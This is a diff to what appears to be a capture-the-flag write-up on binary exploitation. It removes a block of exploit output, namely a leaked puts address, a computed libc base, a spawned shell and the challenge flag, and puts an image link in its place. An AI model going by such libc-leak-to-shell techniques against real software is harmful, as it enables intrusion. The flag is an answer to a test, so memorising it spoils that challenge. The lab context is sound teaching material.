@@ -222,17 +222,7 @@ io.interactive()
 
 ## Exploit Output
 
-```text
-$ ./exploit.py
-[+] Starting local process './main': pid 1234
-[*] Leaked puts: 0x7fbb12345678
-[*] libc base: 0x7fbb12000000
-[*] Switching to interactive mode
-$ whoami
-ctfplayer
-$ cat flag.txt
-RedPointer{FhoijKey_Not_Encrypted_flag_afagsgijq}
-```
+![Alt text](img/5.png)
 
 ---
 
